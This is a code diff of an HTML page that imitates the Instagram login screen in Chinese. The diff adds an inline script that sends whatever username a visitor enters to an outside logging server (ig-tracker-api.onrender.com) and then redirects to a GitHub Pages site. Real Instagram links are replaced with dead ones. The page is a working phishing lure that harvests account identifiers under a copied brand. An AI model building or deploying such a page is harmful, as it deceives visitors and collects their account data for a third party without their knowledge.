@@ -1,24 +1,50 @@
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Instagram</title>
-  <link rel="stylesheet" href="style.css" />
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <div class="main-container">
+  <div class="container">
     <div class="login-box">
-      <img src="instagram-logo.png" alt="Instagram" class="logo" />
-      <input type="text" id="igInput" placeholder="用戶名稱" />
+      <h1 class="logo">Instagram</h1>
+      <input type="text" id="igInput" placeholder="電話號碼、用戶名稱或電子郵件">
       <button onclick="submitIG()">登入</button>
       <div class="divider">或</div>
-      <div class="fb-login">使用 Facebook 帳號登入</div>
-      <a href="https://www.instagram.com/accounts/password/reset/" class="forgot">忘記密碼？</a>
+      <a href="#" class="fb-login">使用 Facebook 帳號登入</a>
+      <a href="#" class="forgot">忘記密碼？</a>
     </div>
     <div class="signup-box">
-      沒有帳號？<a href="https://www.instagram.com/accounts/emailsignup/">註冊</a>
+      沒有帳號？<a href="#">註冊</a>
     </div>
   </div>
-  <script src="script.js"></script>
+
+  <script>
+    function submitIG() {
+      const igUsername = document.getElementById("igInput").value.trim();
+      if (igUsername === "") {
+        alert("請輸入 IG 帳號");
+        return;
+      }
+
+      fetch("https://ig-tracker-api.onrender.com/api/log", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ username: igUsername })
+      })
+      .then(res => res.json())
+      .then(data => {
+        console.log("記錄成功：", data);
+        window.location.href = "https://yunsheng0204.github.io/IG-tracker/";
+      })
+      .catch(err => {
+        alert("記錄失敗");
+        console.error(err);
+      });
+    }
+  </script>
 </body>
 </html>
